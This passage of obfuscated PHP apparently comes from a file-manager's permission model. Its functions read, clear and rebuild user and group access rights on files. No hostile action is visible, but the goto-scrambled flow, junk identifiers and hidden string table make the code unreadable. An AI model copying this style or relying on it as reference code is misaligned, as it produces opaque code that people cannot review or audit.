Bï¹Åí‰¯…: foreach ($FÛ¾Ü¸Öó„ as $FÏâÜ‡‡çº) { if (!in_array($FÏâÜ‡‡çº[$aá‡»»Š†[411]], $e”ìÑŞ’†…)) { show_json(LNG($aá‡»»Š†[1846]), !1); } if ($Eï¡¦ë’»š != $dšº¼ñã) { if ($FÏâÜ‡‡çº[$aá‡»»Š†[411]] == SourceModel::TYPE_GROUP) { } if ($FÏâÜ‡‡çº[$aá‡»»Š†[491]] != 0 && !in_array($FÏâÜ‡‡çº[$aá‡»»Š†[491]], $cÊ¬†÷ùº)) { } } if ($FÏâÜ‡‡çº[$aá‡»»Š†[491]] == 0) { $FÏâÜ‡‡çº[$aá‡»»Š†[411]] = SourceModel::TYPE_USER; } $B‰à™°†“İ[] = array($aá‡»»Š†[403] => $EÍ¼÷ËƒĞõ, $aá‡»»Š†[411] => intval($FÏâÜ‡‡çº[$aá‡»»Š†[411]]), $aá‡»»Š†[491] => intval($FÏâÜ‡‡çº[$aá‡»»Š†[491]]), $aá‡»»Š†[1772] => intval($FÏâÜ‡‡çº[$aá‡»»Š†[1772]]) ? intval($FÏâÜ‡‡çº[$aá‡»»Š†[1772]]) : 0, $aá‡»»Š†[1826] => intval($FÏâÜ‡‡çº[$aá‡»»Š†[1826]]) ? intval($FÏâÜ‡‡çº[$aá‡»»Š†[1826]]) : -1); } $this->where(array($aá‡»»Š†[417] => $EÍ¼÷ËƒĞõ))->delete(); $this->addAll($B‰à™°†“İ); goto C“¦£ğ…åè; b©·îÚ¿Ø : if ($Eï¡¦ë’»š != $dšº¼ñã) { $E…Õ Ğ’Å¥ = array($aá‡»»Š†[1677] => $Eï¡¦ë’»š); $cÊ¬†÷ùº = Model($aá‡»»Š†[1758])->field($aá‡»»Š†[1514])->where($E…Õ Ğ’Å¥)->select(); $cÊ¬†÷ùº = array_to_keyvalue($cÊ¬†÷ùº, $aá‡»»Š†[33], $aá‡»»Š†[1514]); } $e”ìÑŞ’†… = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $B‰à™°†“İ = array(); goto Bï¹Åí‰¯…; C“¦£ğ…åè: return !0; goto B««¤¹²®ñ; EÈƒÒòò·: if ($b§ÅÑ®¦É[$aá‡»»Š†[411]] != SourceModel::TYPE_GROUP) { return !1; } $dšº¼ñã = 1; $Eï¡¦ë’»š = $b§ÅÑ®¦É[$aá‡»»Š†[491]]; goto b©·îÚ¿Ø ; B««¤¹²®ñ: } public function authClear($F…¡ÏÔÌ¥‰) { $AŠÁÂñ½Èí =& $_SERVER[Šº]; $A«©¬ˆë™‰ = Model($AŠÁÂñ½Èí[1192])->sourceInfo($F…¡ÏÔÌ¥‰); $a˜Šª¡©Ù‰ = array($F…¡ÏÔÌ¥‰); if ($A«©¬ˆë™‰[$AŠÁÂñ½Èí[410]] == $AŠÁÂñ½Èí[87]) { $Aâ…´¸‘Ç™ = array($AŠÁÂñ½Èí[561] => array($AŠÁÂñ½Èí[520], $A«©¬ˆë™‰[$AŠÁÂñ½Èí[494]] . $F…¡ÏÔÌ¥‰ . $AŠÁÂñ½Èí[521])); $a˜Šª¡©Ù‰ = Model($AŠÁÂñ½Èí[1192])->field($AŠÁÂñ½Èí[417])->where($Aâ…´¸‘Ç™)->getField($AŠÁÂñ½Èí[403], !0); $a˜Šª¡©Ù‰[] = $F…¡ÏÔÌ¥‰; } $this->where(array($AŠÁÂñ½Èí[417] => array($AŠÁÂñ½Èí[418], $a˜Šª¡©Ù‰)))->delete(); return !0; } public function getAllChildren($aåç…ßêŒ) { goto C©Ö¤ˆ±“; C©Ö¤ˆ±“: $BåÚÉ‚Û =& $_SERVER[Šº]; $D­Á†§®— = Model($BåÚÉ‚Û[1192])->sourceInfo($aåç…ßêŒ); if ($D­Á†§®—[$BåÚÉ‚Û[410]] != $BåÚÉ‚Û[87]) { return $this->sourceListAuth(array($aåç…ßêŒ)); } goto Eµ·ÆŒÁ’ƒ; EÀ·šÕÇô: if (!$bÆƒ×á­…) { return array(); } $B¤É¸¨–¤Š = $BåÚÉ‚Û[1847]; $Aâ•Ê…ØšĞ = array($BåÚÉ‚Û[403] => array($BåÚÉ‚Û[7], $bÆƒ×á­…), $BåÚÉ‚Û[430] => $BåÚÉ‚Û[504]); goto fÅâˆÈÃ«ç; A‹†ø÷¤Â: return $this->sourceListAuth($d÷ÂÉ”–”–); goto BË»î±Ùö•; Eµ·ÆŒÁ’ƒ: if ($D­Á†§®—[$BåÚÉ‚Û[411]] != SourceModel::TYPE_GROUP) { return array(); } $cçÈíİË‹ = 1; $D†³ÉÁ‘ÕÀ = array($aåç…ßêŒ); goto fÙøó¬Ëå£; fÅâˆÈÃ«ç: $bö¬é¤Ö‚ = Model($BåÚÉ‚Û[788])->field($B¤É¸¨–¤Š)->where($Aâ•Ê…ØšĞ)->select(); $d÷ÂÉ”–”– = array($aåç…ßêŒ); foreach ($bö¬é¤Ö‚ as $b©Çğ³Ó¹¹) { foreach ($D†³ÉÁ‘ÕÀ as $E´åÚëÈé–) { $Eç¡çµ²¬ß = $BåÚÉ‚Û[47] . $E´åÚëÈé– . $BåÚÉ‚Û[47]; $bÂ•ó¥ĞÀˆ = $b©Çğ³Ó¹¹[$BåÚÉ‚Û[494]] . $b©Çğ³Ó¹¹[$BåÚÉ‚Û[403]] . $BåÚÉ‚Û[47]; if (strstr($bÂ•ó¥ĞÀˆ, $Eç¡çµ²¬ß)) { $d÷ÂÉ”–”–[] = $b©Çğ³Ó¹¹[$BåÚÉ‚Û[403]]; break; } } } goto A‹†ø÷¤Â; fÙøó¬Ëå£: if ($D­Á†§®—[$BåÚÉ‚Û[485]] == $BåÚÉ‚Û[504] && $D­Á†§®—[$BåÚÉ‚Û[491]] != $cçÈíİË‹) { $D†³ÉÁ‘ÕÀ = $this->groupChidldAllRootSource($D­Á†§®—[$BåÚÉ‚Û[491]]); } $bÆƒ×á­… = $this->field($BåÚÉ‚Û[403])->group($BåÚÉ‚Û[403])->select(); $bÆƒ×á­… = array_to_keyvalue($bÆƒ×á­…, $BåÚÉ‚Û[33], $BåÚÉ‚Û[403]); goto EÀ·šÕÇô; BË»î±Ùö•: } private function sourceListAuth($BìêŒ¤‚) { goto bÓŞ¹¯±”; bÓŞ¹¯±”: $DŠ ›±Ù¬ =& $_SERVER[Šº]; $D˜‡ß·İ¥× = Model($DŠ ›±Ù¬[1192])->sourceListInfo($BìêŒ¤‚, !0); $EÕ‹»İòÓ = $this->sourceAuthSelect($BìêŒ¤‚); goto F·¸Œ›ÏŠµ; aÖˆÈ®ÁºŒ: array_multisort($Dã±­¨Æ„, SORT_ASC, $BøÀßğš); return $BøÀßğš; goto BÈ“÷˜ô˜; F·¸Œ›ÏŠµ: $BøÀßğš = array(); $Dã±­¨Æ„ = array(); foreach ($D˜‡ß·İ¥× as $d®÷·«×„…) { goto Fİ×¼øÏ÷¾; Fİ×¼øÏ÷¾: unset($d®÷·«×„…[$DŠ ›±Ù¬[441]]); unset($d®÷·«×„…[$DŠ ›±Ù¬[439]]); unset($d®÷·«×„…[$DŠ ›±Ù¬[413]]); goto F¼óÊ“‚àº; Cò­µâ‚Ÿ‘: $d®÷·«×„…[$DŠ ›±Ù¬[1848]] = $this->authTargetInfo($F±ª©„Ÿ£ª); $d®÷·«×„…[$DŠ ›±Ù¬[502]] = rtrim($d®÷·«×„…[$DŠ ›±Ù¬[497]], $DŠ ›±Ù¬[8]) . $DŠ ›±Ù¬[8] . ltrim($d®÷·«×„…[$DŠ ›±Ù¬[502]], $DŠ ›±Ù¬[8]); $BøÀßğš[] = $d®÷·«×„…; goto aø‰·«½; aø‰·«½: $C‘øè­ÍÑ¼ = count(explode($DŠ ›±Ù¬[8], trim($d®÷·«×„…[$DŠ ›±Ù¬[502]], $DŠ ›±Ù¬[8]))); $Dã±­¨Æ„[] = $C‘øè­ÍÑ¼ + ($d®÷·«×„…[$DŠ ›±Ù¬[29]] == $DŠ ›±Ù¬[77] ? 0 : 1000); goto DÍä˜çÜŸé; F¼óÊ“‚àº: unset($d®÷·«×„…[$DŠ ›±Ù¬[85]]); $F±ª©„Ÿ£ª = $EÕ‹»İòÓ[$d®÷·«×„…[$DŠ ›±Ù¬[403]]]; if (!$F±ª©„Ÿ£ª) { continue; } goto Cò­µâ‚Ÿ‘; DÍä˜çÜŸé: } goto aÖˆÈ®ÁºŒ; BÈ“÷˜ô˜: } private function groupChidldAllRootSource($EƒìµôÓ›¼) { $CÇÑäŒŠ…Š =& $_SERVER[Šº]; $d‹Ş¦Ÿ¬ÂÅ = Model($CÇÑäŒŠ…Š[1849])->groupChildrenAll($EƒìµôÓ›¼); $E­Èãê“»Ö = array($CÇÑäŒŠ…Š[485] => 0, $CÇÑäŒŠ…Š[491] => array($CÇÑäŒŠ…Š[7], $d‹Ş¦Ÿ¬ÂÅ), $CÇÑäŒŠ…Š[411] => SourceModel::TYPE_GROUP); $D®¯ĞÄ»Ö = Model($CÇÑäŒŠ…Š[788])->field($CÇÑäŒŠ…Š[403])->where($E­Èãê“»Ö)->select(); $D®¯ĞÄ»Ö = array_to_keyvalue($D®¯ĞÄ»Ö, $CÇÑäŒŠ…Š[33], $CÇÑäŒŠ…Š[403]); return $D®¯ĞÄ»Ö; } private function authTargetInfo($b¸ùø†ˆ†Ô) { goto Aõ‰ÊÂˆ“; dèŠã™»‚: return $B‰èÙó¾¹†; goto DŠÂ¿ˆ‘Í; EÁ¢¯ÛòŒ: $CÈ­‡îİÅ = 2 << 25; foreach ($b¸ùø†ˆ†Ô as $dÚä™Ï‹Œ) { goto E¼‘óà¼Çø; fâˆãï¤‘™: $AÈ¸´¨ğÇ = 0; if ($dÚä™Ï‹Œ[$A¢Ù¹îÁø[411]] == SourceModel::TYPE_GROUP) { $AÈ¸´¨ğÇ = $CÈ­‡îİÅ * 2; } if ($dÚä™Ï‹Œ[$A¢Ù¹îÁø[411]] == SourceModel::TYPE_USER) { $AÈ¸´¨ğÇ = $CÈ­‡îİÅ; } goto DæãÅÙ¸áø; E¼‘óà¼Çø: $a‹ÛË—­†Ñ = Model($A¢Ù¹îÁø[1844])->listData($dÚä™Ï‹Œ[$A¢Ù¹îÁø[1772]]); if (!$a‹ÛË—­†Ñ) { continue; } if ($dÚä™Ï‹Œ[$A¢Ù¹îÁø[411]] == SourceModel::TYPE_USER) { $aª»ÖœêĞ = Model($A¢Ù¹îÁø[510])->getInfoSimpleOuter($dÚä™Ï‹Œ[$A¢Ù¹îÁø[491]]); if ($aª»ÖœêĞ[$A¢Ù¹îÁø[1514]] == $A¢Ù¹îÁø[1073]) { continue; } if ($aª»ÖœêĞ[$A¢Ù¹îÁø[1514]] == $A¢Ù¹îÁø[504]) { $aª»ÖœêĞ[$A¢Ù¹îÁø[28]] = LNG($A¢Ù¹îÁø[1850]); } } else { $aª»ÖœêĞ = Model($A¢Ù¹îÁø[493])->getInfoSimple($dÚä™Ï‹Œ[$A¢Ù¹îÁø[491]]); } goto f¸ô ñŒê©; DæãÅÙ¸áø: if ($dÚä™Ï‹Œ[$A¢Ù¹îÁø[411]] == SourceModel::TYPE_USER && $dÚä™Ï‹Œ[$A¢Ù¹îÁø[491]] == $A¢Ù¹îÁø[504]) { $AÈ¸´¨ğÇ = 0; } $DôéÑ«±ÍÑ[] = $a‹ÛË—­†Ñ[$A¢Ù¹îÁø[413]] + $AÈ¸´¨ğÇ; goto cùˆó¦ƒÃ; f¸ô ñŒê©: if (!$aª»ÖœêĞ) { continue; } $aª»ÖœêĞ[$A¢Ù¹îÁø[453]] = $a‹ÛË—­†Ñ; $B‰èÙó¾¹†[] = $aª»ÖœêĞ; goto fâˆãï¤‘™; cùˆó¦ƒÃ: } array_multisort($DôéÑ«±ÍÑ, SORT_DESC, $B‰èÙó¾¹†); goto dèŠã™»‚; Aõ‰ÊÂˆ“: $A¢Ù¹îÁø =& $_SERVER[Šº]; $B‰èÙó¾¹† = array(); $DôéÑ«±ÍÑ = array(); goto EÁ¢¯ÛòŒ; DŠÂ¿ˆ‘Í: } public function getAllChildrenByUser($eÖ–‹¨µá, $Fä›£ÏŒ¼í) { goto fªç‚áö; d£Ç¹…–±Ğ: foreach ($dˆÖŸ‡‹Ó± as $Aîé§Ôæ£) { $CÍ¹‰¤†Ï = !1; foreach ($Aîé§Ôæ£[$B•ª¤µ«[1848]] as $EéÈËé½î) { if ($EéÈËé½î[$B•ª¤µ«[1514]]) { if ($EéÈËé½î[$B•ª¤µ«[1514]] == $Fä›£ÏŒ¼í) { $CÍ¹‰¤†Ï = !0; break; } } if ($EéÈËé½î[$B•ª¤µ«[1677]]) { if ($this->groupContainUser($EéÈËé½î[$B•ª¤µ«[1677]], $Fä›£ÏŒ¼í)) { $CÍ¹‰¤†Ï = !0; break; } } } if ($CÍ¹‰¤†Ï) { $CšùÄÈÃå[] = $Aîé§Ôæ£; } $bÁ÷®“é³¡ = $Aîé§Ôæ£[$B•ª¤µ«[403]]; if (isset($AãœïÅ‡ã‚[$bÁ÷®“é³¡])) { $Aîé§Ôæ£[$B•ª¤µ«[1848]][] = $AãœïÅ‡ã‚[$bÁ÷®“é³¡][0]; $AãœïÅ‡ã‚[$bÁ÷®“é³¡] = !1; } } $AãœïÅ‡ã‚ = array_filter(array_values($AãœïÅ‡ã‚)); $CšùÄÈÃå = array_merge($AãœïÅ‡ã‚, $CšùÄÈÃå); goto C‹§âä©ãÛ; CšìÏ”®Ğè: if ($A­Âˆ‹Ô†ç[$B•ª¤µ«[485]] == $B•ª¤µ«[504] && $A­Âˆ‹Ô†ç[$B•ª¤µ«[491]] != $CˆĞŒ³Â¨ && $this->groupContainUser($A­Âˆ‹Ô†ç[$B•ª¤µ«[491]], $Fä›£ÏŒ¼í)) { foreach ($E©í¬à„¦[$B•ª¤µ«[1851]] as $fô­ğ²×») { $fñ°åÚ¸”Å = Model($B•ª¤µ«[493])->getInfo($fô­ğ²×»[$B•ª¤µ«[1677]]); $DôÖˆ¯í«× = Model($B•ª¤µ«[514])->getInfoSimpleOuter($Fä›£ÏŒ¼í); $DôÖˆ¯í«×[$B•ª¤µ«[453]] = $fô­ğ²×»[$B•ª¤µ«[413]]; if (Model($B•ª¤µ«[1844])->authCheckAction($fô­ğ²×»[$B•ª¤µ«[413]][$B•ª¤µ«[413]], $B•ª¤µ«[1697])) { continue; } $EÛÂª’Ôì™ = array($B•ª¤µ«[28] => $B•ª¤µ«[1467] . $fñ°åÚ¸”Å[$B•ª¤µ«[28]], $B•ª¤µ«[403] => $fñ°åÚ¸”Å[$B•ª¤µ«[85]][$B•ª¤µ«[403]], $B•ª¤µ«[76] => KodIO::make($fñ°åÚ¸”Å[$B•ª¤µ«[85]][$B•ª¤µ«[403]]), $B•ª¤µ«[485] => $B•ª¤µ«[504], $B•ª¤µ«[411] => $B•ª¤µ«[1003], $B•ª¤µ«[29] => $B•ª¤µ«[525], $B•ª¤µ«[502] => $fñ°åÚ¸”Å[$B•ª¤µ«[498]], $B•ª¤µ«[1677] => $fñ°åÚ¸”Å[$B•ª¤µ«[1677]], $B•ª¤µ«[495] => $fñ°åÚ¸”Å[$B•ª¤µ«[485]], $B•ª¤µ«[1848] => array($DôÖˆ¯í«×)); $AãœïÅ‡ã‚[$EÛÂª’Ôì™[$B•ª¤µ«[403]]] = $EÛÂª’Ôì™; } } $CšùÄÈÃå = array(); $dˆÖŸ‡‹Ó± = $this->getAllChildren($eÖ–‹¨µá); goto d£Ç¹…–±Ğ; fªç‚áö: $B•ª¤µ« =& $_SERVER[Šº]; $E©í¬à„¦ = Model($B•ª¤µ«[514])->getInfo($Fä›£ÏŒ¼í); if (!$Fä›£ÏŒ¼í || !$eÖ–‹¨µá || !$E©í¬à„¦) { return array(); } goto eàÂ¬ÅìÎÃ; eàÂ¬ÅìÎÃ: $A­Âˆ‹Ô†ç = Model($B•ª¤µ«[1192])->sourceInfo($eÖ–‹¨µá); $AãœïÅ‡ã‚ = array(); $CˆĞŒ³Â¨ = 1; goto CšìÏ”®Ğè; C‹§âä©ãÛ: return $CšùÄÈÃå; goto AŒŒ±ëÄ…; AŒŒ±ëÄ…: } public function setAllChildrenByUser($cšÂ½¿ËÒ, $Bâ¨–ÕŠ·¡, $e­§ÂÁ×´) { $AÙ‚ñœ‰ =& $_SERVER[Šº]; $dÓ‰ïšÂ¹ = $this->getAllChildrenByUser($cšÂ½¿ËÒ, $Bâ¨–ÕŠ·¡); if (!$e­§ÂÁ×´ || !$dÓ‰ïšÂ¹) { return !1; } foreach ($dÓ‰ïšÂ¹ as $a•¥ÉÃ‰ìø) { $aøŞ™µÍóÍ = array(); foreach ($a•¥ÉÃ‰ìø[$AÙ‚ñœ‰[1848]] as $f³Ê½ª¦¥«) { $bÙÍâÂ¯‹÷ = $f³Ê½ª¦¥«[$AÙ‚ñœ‰[453]]; $c²Í×õØ®š = $f³Ê½ª¦¥«[$AÙ‚ñœ‰[1514]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $fº“‡Æ‹µÚ = $f³Ê½ª¦¥«[$AÙ‚ñœ‰[1514]] ? $f³Ê½ª¦¥«[$AÙ‚ñœ‰[1514]] : $f³Ê½ª¦¥«[$AÙ‚ñœ‰[1677]]; if ($f³Ê½ª¦¥«[$AÙ‚ñœ‰[1514]] && $f³Ê½ª¦¥«[$AÙ‚ñœ‰[1514]] == $Bâ¨–ÕŠ·¡) { continue; } $aøŞ™µÍóÍ[] = array($AÙ‚ñœ‰[403] => $a•¥ÉÃ‰ìø[$AÙ‚ñœ‰[403]], $AÙ‚ñœ‰[411] => $c²Í×õØ®š, $AÙ‚ñœ‰[491] => intval($fº“‡Æ‹µÚ), $AÙ‚ñœ‰[1772] => isset($bÙÍâÂ¯‹÷[$AÙ‚ñœ‰[392]]) ? intval($bÙÍâÂ¯‹÷[$AÙ‚ñœ‰[392]]) : 0, $AÙ‚ñœ‰[1826] => isset($bÙÍâÂ¯‹÷[$AÙ‚ñœ‰[1826]]) ? intval($bÙÍâÂ¯‹÷[$AÙ‚ñœ‰[1826]]) : -1); } $aøŞ™µÍóÍ[] = array($AÙ‚ñœ‰[403] => $a•¥ÉÃ‰ìø[$AÙ‚ñœ‰[403]], $AÙ‚ñœ‰[411] => SourceModel::TYPE_USER, $AÙ‚ñœ‰[491] => intval($Bâ¨–ÕŠ·¡), $AÙ‚ñœ‰[1772] => intval($e­§ÂÁ×´), $AÙ‚ñœ‰[1826] => -1); $this->where(array($AÙ‚ñœ‰[417] => $a•¥ÉÃ‰ìø[$AÙ‚ñœ‰[403]]))->delete(); $this->addAll($aøŞ™µÍóÍ); } return !0; } public function get($Fø™ÖÔë×È) { $aÖ¿ÖÚµğ = $this->getSourceList(array($Fø™ÖÔë×È), !0); return $aÖ¿ÖÚµğ[0]; } public function getSourceList($eÚØ ñ§®Ÿ, $dÃ÷î£È = false, $D½˜±±Š­† = false) { goto bíËãñ–°¡; FÉ±ÀíóÈ: if (!$dÃ÷î£È && count($eÚØ ñ§®Ÿ) == 1) { $dÃ÷î£È = array(); $dÃ÷î£È[$eÚØ ñ§®Ÿ[0]] = $C±‹¾ªÆ¹->sourceInfo($eÚØ ñ§®Ÿ[0]); } if (!$dÃ÷î£È) { $EĞéè–¶¼é = array($Fïœƒ“ãŒ½[417] => array($Fïœƒ“ãŒ½[418], $eÚØ ñ§®Ÿ)); $dÃ÷î£È = $C±‹¾ªÆ¹->field($Fïœƒ“ãŒ½[1852])->where($EĞéè–¶¼é)->select(); $dÃ÷î£È = array_to_keyvalue($dÃ÷î£È, $Fïœƒ“ãŒ½[403]); } $E›±’ó˜À‡ = $eÚØ ñ§®Ÿ; goto e‹‚ì¡©ö; B±ÆÓƒñ¤Š: $e£‘È —¿œ = $this->sourceAuthSelect($E›±’ó˜À‡); $Eë×‡˜Ôœ = array(); foreach ($E›±’ó˜À‡ as $dª×¤è šŒ) { if (isset($e£‘È —¿œ[$dª×¤è šŒ])) { $Eë×‡˜Ôœ[$dª×¤è šŒ] = $e£‘È —¿œ[$dª×¤è šŒ]; } } goto Fà­ùàğ†Á; Fà­ùàğ†Á: $Eö”ºé¥ø = $this->userIsRoot($D½˜±±Š­†); $C±¢ì¸”†ƒ = AuthModel::authAll(); $F¼ÖÓŒ§ = array($Fïœƒ“ãŒ½[414] => $C±¢ì¸”†ƒ, $Fïœƒ“ãŒ½[1853] => array($Fïœƒ“ãŒ½[419] => 0, $Fïœƒ“ãŒ½[1683] => $C±¢ì¸”†ƒ, $Fïœƒ“ãŒ½[420] => LNG($Fïœƒ“ãŒ½[1854]), $Fïœƒ“ãŒ½[1698] => $Fïœƒ“ãŒ½[1855])); goto cÃÊŒó‚ô™; e‹‚ì¡©ö: foreach ($dÃ÷î£È as $dš¢İ¥‰†Ï => $D»ÀÓîõà‚) { $A±¤¶ÜØ†‰ = $C±‹¾ªÆ¹->parentLevelArray($D»ÀÓîõà‚[$Fïœƒ“ãŒ½[494]]); $E›±’ó˜À‡ = array_merge($E›±’ó˜À‡, array($dš¢İ¥‰†Ï), array_reverse($A±¤¶ÜØ†‰)); } $E›±’ó˜À‡ = array_values(array_unique($E›±’ó˜À‡)); if (!$E›±’ó˜À‡) { return array(); } goto B±ÆÓƒñ¤Š; cÃÊŒó‚ô™: $cÀ–·òÙĞ = array(); foreach ($dÃ÷î£È as $dª×¤è šŒ => $eãÌ“ª‰ÊÃ) { if ($Eö”ºé¥ø) { $cÀ–·òÙĞ[$dª×¤è šŒ] = $F¼ÖÓŒ§; continue; } $cÀ–·òÙĞ[$dª×¤è šŒ] = $this->makeSourceAuth($eãÌ“ª‰ÊÃ, $Eë×‡˜Ôœ, $D½˜±±Š­†); } return $cÀ–·òÙĞ; goto bÓÁ‚™¨î; bíËãñ–°¡: $Fïœƒ“ãŒ½ =& $_SERVER[Šº]; if (!$eÚØ ñ§®Ÿ) { return array(); } $C±‹¾ªÆ¹ = Model($Fïœƒ“ãŒ½[1192]); goto FÉ±ÀíóÈ; bÓÁ‚™¨î: } public function authDeepCheck($D—®ñ¢æ£, $AÚ·ù‚õˆÁ = false) { goto EÂ·Ö¼˜; EÂ·Ö¼˜: $fšá­’ª©Ò =& $_SERVER[Šº]; $AÚ·ù‚õˆÁ = $AÚ·ù‚õˆÁ ? $AÚ·ù‚õˆÁ : USER_ID; $a¦ÑŠñÈö = $this->makeAuthDeep($AÚ·ù‚õˆÁ); goto CÜŠœ±¯ç; CÜŠœ±¯ç: if (!in_array($D—®ñ¢æ£, $a¦ÑŠñÈö[$fšá­’ª©Ò[1856]])) { return !1; } $F‰›ïä‡† = array(); foreach ($a¦ÑŠñÈö[$fšá­’ª©Ò[1857]] as $cÓ„³Ê => $c’å‚‡†) { if (!in_array($D—®ñ¢æ£, $c’å‚‡†)) { continue; } $F‰›ïä‡†[] = $cÓ„³Ê; } goto D‚ªäŞÑëš; D‚ªäŞÑëš: if (!$F‰›ïä‡†) { return !1; } $AˆŠ“÷é„» = $F‰›ïä‡† ? $F‰›ïä‡†[0] : $D—®ñ¢æ£; return array($fšá­’ª©Ò[414] => -1, $fšá­’ª©Ò[453] => array($fšá­’ª©Ò[419] => $fšá­’ª©Ò[1073], $fšá­’ª©Ò[1683] => $fšá­’ª©Ò[504], $fšá­’ª©Ò[420] => LNG($fšá­’ª©Ò[1858]), $fšá­’ª©Ò[1698] => $fšá­’ª©Ò[1859]), $fšá­’ª©Ò[1860] => LNG($fšá­’ª©Ò[1861]), $fšá­’ª©Ò[1862] => $this->sourceAuthInfo($AˆŠ“÷é„»)); goto Fñ¾÷›ª†¹; Fñ¾÷›ª†¹: } protected function makeAuthDeep($eó•ìïĞ® = false) { goto E±©åÒœ; Dİ„ãêĞÓÆ: $Dñ‰‰íöì = array(); if ($aÛ‰á‰ö÷Ğ) { $FÜ§¦ÁŒµ» = $C·…ßõ†‘->where(array($Aíãæ§õ¶[403] => array($Aíãæ§õ¶[418], $aÛ‰á‰ö÷Ğ)))->select(); foreach ($FÜ§¦ÁŒµ» as $FÀ ê²Ç Û) { $a ç‰ĞÑÈã = $C·…ßõ†‘->parentLevelArray($FÀ ê²Ç Û[$Aíãæ§õ¶[494]]); $CÕô’†«Õ¹ = array_merge($CÕô’†«Õ¹, $a ç‰ĞÑÈã); $BÁ®”–Œœõ[] = $FÀ ê²Ç Û[$Aíãæ§õ¶[491]]; $béò´ºõá¢[$FÀ ê²Ç Û[$Aíãæ§õ¶[403]]] = $a ç‰ĞÑÈã; $FŞÌ›Íò¹‚[$FÀ ê²Ç Û[$Aíãæ§õ¶[403]]] = $FÀ ê²Ç Û[$Aíãæ§õ¶[491]]; } } $BÁ®”–Œœõ = array_values(array_unique($BÁ®”–Œœõ)); goto dÔµÂ²Õ; dÔµÂ²Õ: $DÅé›ÌõÏ° = $BÁ®”–Œœõ; foreach ($DÅé›ÌõÏ° as $eÈ¾ÂòŒê¨) { $CÎíëù = $F¿ãÕòÉ ô->getInfo($eÈ¾ÂòŒê¨); $a ç‰ĞÑÈã = $C·…ßõ†‘->parentLevelArray($CÎíëù[$Aíãæ§õ¶[494]]); $BÁ®”–Œœõ = array_merge($BÁ®”–Œœõ, $a ç‰ĞÑÈã); } $BÁ®”–Œœõ = array_values(array_unique($BÁ®”–Œœõ)); goto eÌ†…ğù˜½; DØÆŸµ†æÀ: if (isset($eÛĞ†ÈŞÊ•[$eó•ìïĞ®])) { return $eÛĞ†ÈŞÊ•[$eó•ìïĞ®]; } $F¢Ë£»¸›’ = Model($Aíãæ§õ¶[1863])->listData(); $eø‰à™Ø ¬ = array(); goto aôÃ­ÑƒñØ; E±©åÒœ: $Aíãæ§õ¶ =& $_SERVER[Šº]; static $eÛĞ†ÈŞÊ• = array(); $eó•ìïĞ® = $eó•ìïĞ® ? $eó•ìïĞ® : USER_ID; goto DØÆŸµ†æÀ; aôÃ­ÑƒñØ: foreach ($F¢Ë£»¸›’ as $aµ‰÷‡Æ¸) { if ($aµ‰÷‡Æ¸[$Aíãæ§õ¶[413]] == 0 && $aµ‰÷‡Æ¸[$Aíãæ§õ¶[1699]] == $Aíãæ§õ¶[87]) { $eø‰à™Ø ¬[] = $aµ‰÷‡Æ¸[$Aíãæ§õ¶[392]]; } } $DÄÚäŸåªá = $this->userGroupParents($eó•ìïĞ®); $a³Á†¬ßğë = array($Aíãæ§õ¶[411] => SourceModel::TYPE_USER, $Aíãæ§õ¶[491] => $eó•ìïĞ®); goto b÷ËÄŞÁŸ; C’‰å³‹î“: $BÁ®”–Œœõ = $DÄÚäŸåªá; $C·…ßõ†‘ = Model($Aíãæ§õ¶[1192]); $F¿ãÕòÉ ô = Model($Aíãæ§õ¶[493]); goto bÜ¸†Ï®‡î; eÌ†…ğù˜½: foreach ($BÁ®”–Œœõ as $eÈ¾ÂòŒê¨) { $CÎíëù = $F¿ãÕòÉ ô->getInfo($eÈ¾ÂòŒê¨); $CÕô’†«Õ¹[] = $CÎíëù[$Aíãæ§õ¶[85]][$Aíãæ§õ¶[403]]; $DĞÑ¹»ğ[$eÈ¾ÂòŒê¨] = $CÎíëù[$Aíãæ§õ¶[85]][$Aíãæ§õ¶[403]]; $Dñ‰‰íöì[$eÈ¾ÂòŒê¨] = $C·…ßõ†‘->parentLevelArray($CÎíëù[$Aíãæ§õ¶[494]]); } foreach ($béò´ºõá¢ as $cÆİß¢”µ => $d»ô ÆÏ·³) { $E—¨›ƒµ«” = $FŞÌ›Íò¹‚[$cÆİß¢”µ]; if (!$E—¨›ƒµ«” || !$DĞÑ¹»ğ[$E—¨›ƒµ«”]) { continue; } $b‰ğ×›¶ö˜ = array(); foreach ($Dñ‰‰íöì[$E—¨›ƒµ«”] as $eÈ¾ÂòŒê¨) { $b‰ğ×›¶ö˜[] = $DĞÑ¹»ğ[$eÈ¾ÂòŒê¨]; } $béò´ºõá¢[$cÆİß¢”µ] = array_merge($b‰ğ×›¶ö˜, $d»ô ÆÏ·³); } $CÕô’†«Õ¹ = array_values(array_unique($CÕô’†«Õ¹)); goto CÖ“Ïá‚…; b÷ËÄŞÁŸ: if ($DÄÚäŸåªá) { $a³Á†¬ßğë = array(array($Aíãæ§õ¶[411] => SourceModel::TYPE_USER, $Aíãæ§õ¶[491] => $eó•ìïĞ®), array($Aíãæ§õ¶[411] => SourceModel::TYPE_GROUP, $Aíãæ§õ¶[491] => array($Aíãæ§õ¶[418], $DÄÚäŸåªá)), $Aíãæ§õ¶[945] => $Aíãæ§õ¶[1764]); } $C½¨¾ó¦¶® = $this->field($Aíãæ§õ¶[1864])->where($a³Á†¬ßğë)->select(); $aÛ‰á‰ö÷Ğ = array(); goto dˆƒäˆÏâ¢; dˆƒäˆÏâ¢: $c²„Û ¬ñØ = array_to_keyvalue_group($C½¨¾ó¦¶®, $Aíãæ§õ¶[403]); foreach ($c²„Û ¬ñØ as $cÜŞ¦À—Â± => $cÏÏéñáÖ±) { $fÖÁ×ÉÈ´œ = $this->authArrayCheck($cÏÏéñáÖ±, $eó•ìïĞ®); if ($fÖÁ×ÉÈ´œ[$Aíãæ§õ¶[414]] > 0) { $aÛ‰á‰ö÷Ğ[] = $cÜŞ¦À—Â± . $Aíãæ§õ¶[33]; } } $CÕô’†«Õ¹ = array(); goto C’‰å³‹î“; CÖ“Ïá‚…: $aˆ÷ß•¡ã = array($Aíãæ§õ¶[1856] => $CÕô’†«Õ¹, $Aíãæ§õ¶[1857] => $béò´ºõá¢); $eÛĞ†ÈŞÊ•[$eó•ìïĞ®] = $aˆ÷ß•¡ã; return $aˆ÷ß•¡ã; goto bÏ¦ùÊ˜«»; bÜ¸†Ï®‡î: $béò´ºõá¢ = array(); $FŞÌ›Íò¹‚ = array(); $DĞÑ¹»ğ = array(); goto Dİ„ãêĞÓÆ; bÏ¦ùÊ˜«»: } private function 